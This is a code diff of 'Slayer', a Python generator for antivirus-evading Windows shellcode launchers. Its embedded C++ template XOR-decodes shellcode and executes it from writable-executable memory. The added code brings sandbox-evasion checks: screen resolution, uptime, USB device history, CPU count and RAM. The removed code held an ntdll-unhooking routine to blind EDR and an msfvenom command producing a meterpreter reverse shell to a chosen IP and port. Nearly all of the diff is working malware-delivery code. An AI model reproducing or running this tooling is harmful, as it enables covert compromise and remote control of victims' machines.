@@ -4,7 +4,6 @@ import random
 import string
 import os
 import time
-import argparse
 
 
 def get_random_string():
@@ -31,133 +30,91 @@ def create_template():
     template.write(
     r'''#include <windows.h>
 #include <stdio.h>
+#include <iostream>
+#define MULTI_LINE_STRING(a) #a
+#pragma comment(linker, "/INCREMENTAL:YES")
 #pragma comment(lib, "user32.lib")
 #define WIN32_LEAN_AND_MEAN
-#include <iostream>
-#include <tlhelp32.h>
-#include <winternl.h>
-#include <psapi.h>
 
-#define UNICODE
-
-		BOOL greenCardHuseyin() {
-		  SYSTEM_INFO inf;
-		  MEMORYSTATUSEX memStat;
-		  DWORD proc;
-		  DWORD belleq;
-		  GetSystemInfo(&inf);
-		  proc = inf.dwNumberOfProcessors;
-		  if (proc < 2) return false;
-		  memStat.dwLength = sizeof(memStat);
-		  GlobalMemoryStatusEx(&memStat);
-		  belleq = memStat.ullTotalPhys / 1024 / 1024 / 1024;
-		  if (belleq < 2) return false;
-		  return true;
-		}
-			
-			
-
-		BOOL AppisRunning(CHAR *app) {
-		    BOOL bResult = FALSE;
-		    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-		    PROCESSENTRY32 pe32;
-		    pe32.dwSize = sizeof(PROCESSENTRY32);
-
-		    if(Process32First(hSnap, &pe32)) {
-			do {
-			    if(strcmp(pe32.szExeFile, app) == 0) {
-				bResult = TRUE;
-				break;
-			    }
-			} while(Process32Next(hSnap, &pe32));
-		    }
-
-		    CloseHandle(hSnap);
-
-		    return bResult;
-		}
+bool CALLBACK MyCallback(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lpRect, LPARAM data)
+{
+	MONITORINFO monitorInfo;
+	monitorInfo.cbSize = sizeof(MONITORINFO);
+	GetMonitorInfoW(hMonitor, &monitorInfo);
+	int xResolution = monitorInfo.rcMonitor.right - monitorInfo.rcMonitor.left;
+	int yResolution = monitorInfo.rcMonitor.top - monitorInfo.rcMonitor.bottom;
+	if (xResolution < 0) xResolution = -xResolution;
+	if (yResolution < 0) yResolution = -yResolution;
+	if ((xResolution != 1920 && xResolution != 2560 && xResolution != 1440)
+		|| (yResolution != 1080 && yResolution != 1200 && yResolution != 1600 && yResolution != 900))
+	{
+		*((BOOL*)data) = true;
+	}
+	return true;
+}
 
 
 int main(int argc, char** argv)
 {
 
-    if(!AppisRunning("RuntimeBroker.exe")) {
+	MONITORENUMPROC pMyCallback = (MONITORENUMPROC)MyCallback;
+	int xResolution = GetSystemMetrics(SM_CXSCREEN);
+	int yResolution = GetSystemMetrics(SM_CYSCREEN);
+	if ((xResolution < 1000 && yResolution < 1000)){
+	        ExitThread(0);
+	}else{ 
 
-    } else {
-    	
-    if (greenCardHuseyin() == false) {
-    return -2;
-    }
-    else{
+	
+	ULONGLONG uptime = GetTickCount() / 1000;
+	if (uptime < 1200) return false;
+
+	HKEY hKey;
+	DWORD mountedUSBDevicesCount;
+	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Enum\\USBSTOR", 0, KEY_READ, &hKey);
+	RegQueryInfoKey(hKey, NULL, NULL, NULL, &mountedUSBDevicesCount, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+	if (mountedUSBDevicesCount < 1) return false;
     
-        HANDLE process = GetCurrentProcess();
-        MODULEINFO modi = {};
-        HMODULE ntdll_handle = GetModuleHandleA("ntdll.dll");
+	SYSTEM_INFO systemInfo;
+	GetSystemInfo(&systemInfo);
+	DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
+	if (numberOfProcessors < 2) return false;
 
+	MEMORYSTATUSEX memoryStatus;
+	memoryStatus.dwLength = sizeof(memoryStatus);
+	GlobalMemoryStatusEx(&memoryStatus);
+	DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
+	if (RAMMB < 2048) return false;
+		
         unsigned char buf[] = " ";
         char key[] = " ";
         char shellcode[sizeof buf];
         int j = 0;
-
-        GetModuleInformation(process, ntdll_handle, &modi, sizeof(modi));
-        LPVOID ntdllBase = (LPVOID)modi.lpBaseOfDll;
-        HANDLE ntdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-        HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
-        LPVOID ntdllMAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);
-
-        PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
-        PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);
-
         for (int i = 0; i < sizeof buf; i++)
         {
-            if (j == sizeof key - 1) j = 0;
+            if(j == sizeof key -1 ) j = 0;
             shellcode[i] = buf[i] ^ key[j];
             j++;
         }
-
-        for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
-            PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
-
-            if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
-                DWORD oldProtection = 0;
-                bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
-                memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
-                isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
-            }
-        }
-
-        void* noedrnocry = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-        memcpy(noedrnocry, shellcode, sizeof shellcode);
-        ((void(*)())noedrnocry)();
-
-
-        CloseHandle(process);
-        CloseHandle(ntdllFile);
-        CloseHandle(ntdllMapping);
-        FreeLibrary(ntdll_handle);
-
+        
+        void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        memcpy(exec, shellcode, sizeof shellcode);
+        ((void(*)())exec)();
         return 0;
-    }
+       }
 }
-}
-
 ''')
     template.close()
 
 
-def slayer(payload_type, ip, port, arch):
+def slayer():
     xorkey = get_random_string()
     buf = get_random_string()
     shellcode = get_random_string()
-    ntdllFile = get_random_string()
-    ntdllMapping = get_random_string()
-    ntdllMAddress = get_random_string()
+    monitorinfo = get_random_string()
+    systemInfo = get_random_string()
     print("[*] Generating code...")
     create_template()
     time.sleep(1)
-    venom = f"msfvenom -a {arch} --platform Windows -p windows/x64/meterpreter/reverse_{payload_type} LHOST={ip} LPORT={port} -f raw -o shellcode.raw"
-    print(venom)
-    os.system(venom)
     print("[*] Generating payload...")
     time.sleep(5)
     try:
@@ -172,11 +129,12 @@ def slayer(payload_type, ip, port, arch):
     time.sleep(1)
     data = data.replace('unsigned char buf[] = " ";', "unsigned char buf[] = " + ciphertext + " ")
     data = data.replace('char key[] = " "','char key[] = "' + xorkey + '"')
+    data = data.replace("buf", buf)
     data = data.replace("key", xorkey)
     data = data.replace("shellcode", shellcode)
-    data = data.replace("ntdllFile", ntdllFile)
-    data = data.replace("ntdllMapping", ntdllMapping)
-    data = data.replace('ntdllMAddress', ntdllMAddress)
+    data = data.replace("monitorInfo", monitorinfo)
+    data = data.replace("systemInfo", systemInfo)
+
     template.close()
     template = open("slayer.cpp", "w+")
     template.write(data)
@@ -210,29 +168,19 @@ banner ='''
 										  $$$$$$$$$$""""           ""$$$$$$$$$$$"
 										   "$$$$$"                      ""$$$$""
 										     $$$"                         $$$$"
+
+
 										      Mert Umut : @twitter.com/whoismept
 									              Mert Daş  : @twitter.com/merterpreter
+
 '''
 
 def main():
     print(banner)
-    print("Additional options:-t for payload, -a for architecture, -p for port number, -i for IP address\n")
-    parser = argparse.ArgumentParser(description="Slayer: Undetected shellcode launcher generator, an AV Slayer..", 
-    usage="slayer.py -t payload type -i IP address -p port number -a architecture \nExample: slayer.py -P windows/x64/meterpreter/reverse_tcp -i eth0 interface -p 4444 -a x64\n")
-    parser.add_argument('-t', '--type', help="Define connection type eg. reverse_tcp, reverse_https, reverse_http", type=str, default="tcp")
-    parser.add_argument('-i', '--ip', help="IP address for payload", type=str, default="eth0")
-    parser.add_argument('-p', '--port', help="Port for payload", type=str, default=443)
-    parser.add_argument('-a', '--arch', help="Architecture for payload", type=str, default="x64")
-    args = parser.parse_args()
-    try:
-        slayer(args.type,args.ip, args.port, args.arch)
-        print("[*] Initialising slayer()")
-    except:
-        print("[*] slayer() failed? :(")
-        sys.exit(1)
-
+    slayer()
     print("[+] Compiling...")
     application_name = get_random_string()
+    time.sleep(1)
     os.system(f"x86_64-w64-mingw32-g++ -o {application_name}.exe slayer.cpp -static-libstdc++ -static-libgcc")
     time.sleep(1)
     os.system("rm -rf slayer.cpp template.cpp shellcode.raw")
